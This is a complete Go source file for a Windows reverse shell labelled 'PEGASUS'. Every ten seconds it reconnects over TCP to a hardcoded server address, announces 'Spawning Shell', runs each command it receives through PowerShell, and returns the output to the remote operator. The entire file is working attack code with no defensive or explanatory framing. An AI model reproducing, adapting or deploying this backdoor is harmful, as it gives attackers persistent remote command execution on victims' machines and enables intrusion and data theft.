package main

/* Importing Librarys */

import (
	"fmt"
	"net"
	"time"
	"bufio"
	"strings"
	"unicode/utf8"
	"bytes"
	"os/exec"
)

/* Defining PEGASUS-Config */
type pegasus struct {
	suffix       string
	ruffix       string
	server       string
	welcome      string
	protocol     string
	shell_name   string
	shell_prefix string
} 

/* PEGASUS-Config */
var exploit pegasus = pegasus {
	welcome:      "\x1b[32m[+]\x1b[39m Spawning Shell...",

	server:       "192.168.178.175:1338",
	protocol:     "tcp",

	shell_name:   "PoWerSHEll.exe",
	shell_prefix: "/C",
	
	suffix:       "\xF3",
	ruffix:       "\n",
}

func main() {
	/* Stable shell loop */
	for {
		/* Wait 10 Seconds */
		time.Sleep(time.Second*10)
		
		/* Execute Main Exploit */
		uexploit()
	}
}

/* Main Exploit */
func uexploit() {
	/* Connect to Server */
	conn, err := net.Dial(exploit.protocol, exploit.server)

	/* Check for dial err (ex:unreachable/denied/etc) */
	if err != nil {
		return
	}

	/* Write Welcome message */
	conn.Write([]byte(exploit.welcome+exploit.suffix))
	
	/* Connection Loop */
	for {
		/* Read Command from server */
		message, _ := bufio.NewReader(conn).ReadString(exploit.ruffix[0])

		/* Check if message is empty or exit */
		if len(message) == 0 || strings.HasPrefix(strings.ToLower(message), "exit") {
			/* Close connection */
			conn.Close()
			break
		}

		/* Execute Command */
		cout := exec.Command(exploit.shell_name, exploit.shell_prefix, strings.TrimSuffix(message, exploit.ruffix))

		/* Remove stdout and err */
		cout.Stdout = nil
		cout.Stderr = nil

		/* Get output from command */
		out, err := cout.Output()

		/* Remove Unknown chars */
		tmp_out := bytes.Map(func(r rune) rune {
			/* Check if char is unkown */
			if r == utf8.RuneError {
				/* Replace unknown char with 0x3F which I think is a question mark */
				return 0x3F
			}
			return r
		}, out)
		out = tmp_out

		/* Set error message */
		var errox []byte = []byte("err.null")
		if err != nil {
			errox = []byte(err.Error())
		}

		/* Replace null with (o/e.null) */
		if len(out) == 0 {
			/* Set New out */
			out = []byte("out.null")
		} 

		/* Check err and Send Buffer */
		if err != nil {
			fmt.Fprintf(conn, "%s"+exploit.suffix, errox)
		} else {
			fmt.Fprintf(conn, "%s"+exploit.suffix, out)
		}
	}
}